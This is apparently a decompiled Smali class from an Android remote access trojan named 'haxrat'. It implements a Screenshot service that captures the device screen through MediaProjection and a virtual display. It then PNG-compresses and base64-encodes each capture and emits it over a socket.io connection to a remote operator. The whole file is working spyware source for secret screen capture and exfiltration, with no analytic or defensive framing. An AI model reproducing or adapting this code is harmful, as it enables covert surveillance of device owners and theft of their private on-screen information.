.class public Lcom/hax4us/haxrat/Screenshot;
.super Landroid/app/Service;
.source "Screenshot.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/hax4us/haxrat/Screenshot$100000001;,
        Lcom/hax4us/haxrat/Screenshot$100000002;
    }
.end annotation


# static fields
.field private static final SCREENCAP_NAME:Ljava/lang/String; = "screencap"

.field private static final VIRTUAL_DISPLAY_FLAGS:I = 0x9


# instance fields
.field public filePath:Ljava/io/File;


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 186
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private send(Ljava/io/File;)V
    .locals 16
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/io/File;",
            ")V"
        }
    .end annotation

    .prologue
    .line 165
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    move-object v9, v1

    :try_start_0
    invoke-virtual {v9}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Landroid/graphics/BitmapFactory;->decodeFile(Ljava/lang/String;)Landroid/graphics/Bitmap;

    move-result-object v9

    move-object v3, v9

    .line 166
    const-string v9, "TAGG"

    new-instance v10, Ljava/lang/StringBuffer;

    move-object v15, v10

    move-object v10, v15

    move-object v11, v15

    invoke-direct {v11}, Ljava/lang/StringBuffer;-><init>()V

    const-string v11, "bitmap "

    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v10

    move-object v11, v1

    invoke-virtual {v11}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v9, v10}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v9

    .line 167
    move-object v9, v3

    if-nez v9, :cond_0

    .line 184
    :goto_0
    return-void

    .line 168
    :cond_0
    new-instance v9, Ljava/io/ByteArrayOutputStream;

    move-object v15, v9

    move-object v9, v15

    move-object v10, v15

    invoke-direct {v10}, Ljava/io/ByteArrayOutputStream;-><init>()V

    move-object v4, v9

    .line 169
    move-object v9, v3

    sget-object v10, Landroid/graphics/Bitmap$CompressFormat;->PNG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v11, 0x64

    move-object v12, v4

    invoke-virtual {v9, v10, v11, v12}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    move-result v9

    .line 170
    move-object v9, v4

    invoke-virtual {v9}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v9

    move-object v5, v9

    .line 171
    move-object v9, v5

    const/4 v10, 0x0

    invoke-static {v9, v10}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v9

    move-object v6, v9

    .line 172
    new-instance v9, Lorg/json/JSONObject;

    move-object v15, v9

    move-object v9, v15

    move-object v10, v15

    invoke-direct {v10}, Lorg/json/JSONObject;-><init>()V

    move-object v7, v9

    .line 173
    move-object v9, v7

    const-string v10, "image"

    const/4 v11, 0x1

    invoke-virtual {v9, v10, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    move-result-object v9

    .line 174
    move-object v9, v7

    const-string v10, "name"

    move-object v11, v1

    invoke-virtual {v11}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v9, v10, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v9

    .line 175
    move-object v9, v7

    const-string v10, "buffer"

    move-object v11, v6

    invoke-virtual {v9, v10, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v9

    .line 177
    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;

    move-result-object v9

    invoke-virtual {v9}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v9

    const-string v10, "0xSS"

    const/4 v11, 0x1

    new-array v11, v11, [Ljava/lang/Object;

    move-object v15, v11

    move-object v11, v15

    move-object v12, v15

    const/4 v13, 0x0

    move-object v14, v7

    aput-object v14, v12, v13

    invoke-virtual {v9, v10, v11}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v9

    .line 184
    :goto_1
    goto :goto_0

    .line 177
    :catch_0
    move-exception v9

    move-object v3, v9

    .line 184
    move-object v9, v3

    invoke-virtual {v9}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_1
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 4
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 57
    move-object v0, p0

    move-object v1, p1

    const/4 v3, 0x0

    check-cast v3, Landroid/os/IBinder;

    move-object v0, v3

    return-object v0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 12
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 61
    move-object v0, p0

    move-object v1, p1

    move v2, p2

    move v3, p3

    move-object v8, v0

    const-string v9, "media_projection"

    invoke-virtual {v8, v9}, Lcom/hax4us/haxrat/Screenshot;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/media/projection/MediaProjectionManager;

    move-object v5, v8

    .line 62
    move-object v8, v5

    move-object v9, v1

    const-string v10, "resultcode"

    const/4 v11, -0x1

    invoke-virtual {v9, v10, v11}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v9

    move-object v10, v1

    const-string v11, "android.intent.extra.INTENT"

    invoke-virtual {v10, v11}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object v10

    check-cast v10, Landroid/content/Intent;

    invoke-virtual {v8, v9, v10}, Landroid/media/projection/MediaProjectionManager;->getMediaProjection(ILandroid/content/Intent;)Landroid/media/projection/MediaProjection;

    move-result-object v8

    move-object v6, v8

    .line 63
    move-object v8, v6

    if-nez v8, :cond_0

    .line 64
    const-string v8, "TAGG"

    const-string v9, "mprojection is null"

    invoke-static {v8, v9}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v8

    .line 67
    :goto_0
    move-object v8, v0

    move-object v9, v6

    invoke-virtual {v8, v9}, Lcom/hax4us/haxrat/Screenshot;->takeScreenShot(Landroid/media/projection/MediaProjection;)Z

    move-result v8

    .line 69
    const/4 v8, 0x2

    move v0, v8

    return v0

    .line 66
    :cond_0
    const-string v8, "TAGG"

    const-string v9, "mprojection not null"

    invoke-static {v8, v9}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v8

    goto :goto_0
.end method

.method public takeScreenShot(Landroid/media/projection/MediaProjection;)Z
    .locals 21

    .prologue
    .line 73
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    move-object v11, v0

    invoke-virtual {v11}, Lcom/hax4us/haxrat/Screenshot;->getResources()Landroid/content/res/Resources;

    move-result-object v11

    invoke-virtual {v11}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v11

    iget v11, v11, Landroid/util/DisplayMetrics;->densityDpi:I

    move v3, v11

    .line 74
    new-instance v11, Landroid/graphics/Point;

    move-object/from16 v20, v11

    move-object/from16 v11, v20

    move-object/from16 v12, v20

    invoke-direct {v12}, Landroid/graphics/Point;-><init>()V

    move-object v4, v11

    .line 75
    move-object v11, v0

    const-string v12, "window"

    invoke-virtual {v11, v12}, Lcom/hax4us/haxrat/Screenshot;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Landroid/view/WindowManager;

    move-object v5, v11

    .line 76
    move-object v11, v5

    invoke-interface {v11}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v11

    move-object v12, v4

    invoke-virtual {v11, v12}, Landroid/view/Display;->getRealSize(Landroid/graphics/Point;)V

    .line 77
    move-object v11, v4

    iget v11, v11, Landroid/graphics/Point;->x:I

    move v6, v11

    move-object v11, v4

    iget v11, v11, Landroid/graphics/Point;->y:I

    move v7, v11

    .line 81
    move v11, v6

    move v12, v7

    const/4 v13, 0x1

    const/4 v14, 0x1

    invoke-static {v11, v12, v13, v14}, Landroid/media/ImageReader;->newInstance(IIII)Landroid/media/ImageReader;

    move-result-object v11

    move-object v8, v11

    .line 82
    move-object v11, v1

    const-string v12, "screencap"

    move v13, v6

    move v14, v7

    move v15, v3

    const/16 v16, 0x9

    move-object/from16 v17, v8

    invoke-virtual/range {v17 .. v17}, Landroid/media/ImageReader;->getSurface()Landroid/view/Surface;

    move-result-object v17

    const/16 v18, 0x0

    check-cast v18, Landroid/hardware/display/VirtualDisplay$Callback;

    const/16 v19, 0x0

    check-cast v19, Landroid/os/Handler;

    invoke-virtual/range {v11 .. v19}, Landroid/media/projection/MediaProjection;->createVirtualDisplay(Ljava/lang/String;IIIILandroid/view/Surface;Landroid/hardware/display/VirtualDisplay$Callback;Landroid/os/Handler;)Landroid/hardware/display/VirtualDisplay;

    move-result-object v11

    move-object v9, v11

    .line 84
    move-object v11, v8

    new-instance v12, Lcom/hax4us/haxrat/Screenshot$100000001;

    move-object/from16 v20, v12

    move-object/from16 v12, v20

    move-object/from16 v13, v20

    move-object v14, v0

    move-object v15, v1

    move/from16 v16, v6

    move/from16 v17, v7

    move-object/from16 v18, v4

    move-object/from16 v19, v9

    invoke-direct/range {v13 .. v19}, Lcom/hax4us/haxrat/Screenshot$100000001;-><init>(Lcom/hax4us/haxrat/Screenshot;Landroid/media/projection/MediaProjection;IILandroid/graphics/Point;Landroid/hardware/display/VirtualDisplay;)V

    const/4 v13, 0x0

    check-cast v13, Landroid/os/Handler;

    invoke-virtual {v11, v12, v13}, Landroid/media/ImageReader;->setOnImageAvailableListener(Landroid/media/ImageReader$OnImageAvailableListener;Landroid/os/Handler;)V

    .line 141
    move-object v11, v1

    new-instance v12, Lcom/hax4us/haxrat/Screenshot$100000002;

    move-object/from16 v20, v12

    move-object/from16 v12, v20

    move-object/from16 v13, v20

    move-object v14, v0

    move-object v15, v9

    move-object/from16 v16, v8

    move-object/from16 v17, v1

    invoke-direct/range {v13 .. v17}, Lcom/hax4us/haxrat/Screenshot$100000002;-><init>(Lcom/hax4us/haxrat/Screenshot;Landroid/hardware/display/VirtualDisplay;Landroid/media/ImageReader;Landroid/media/projection/MediaProjection;)V

    const/4 v13, 0x0

    check-cast v13, Landroid/os/Handler;

    invoke-virtual {v11, v12, v13}, Landroid/media/projection/MediaProjection;->registerCallback(Landroid/media/projection/MediaProjection$Callback;Landroid/os/Handler;)V

    .line 151
    const/4 v11, 0x1

    move v0, v11

    return v0
.end method
